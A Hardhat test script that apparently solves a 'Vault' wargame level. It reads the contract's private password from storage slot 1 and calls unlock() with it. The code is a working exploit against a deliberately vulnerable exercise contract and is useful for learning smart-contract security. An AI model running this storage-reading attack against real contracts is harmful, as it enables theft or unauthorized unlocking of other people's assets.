const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");

describe.only("Vault hack", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        vault = await ethers.getContractAt("Vault", process.env.VAULT_ADDRESS);
});
    describe("Hack test", function() {
        it("Should unlock the vault", async function() {
            expect(await vault.locked()).to.equal(true);
            console.log(await ethers.provider.getStorageAt(process.env.VAULT_ADDRESS, 1));
            await vault.unlock(await ethers.provider.getStorageAt(process.env.VAULT_ADDRESS, 1));
            expect(await vault.locked()).to.equal(false);
        });
    });
});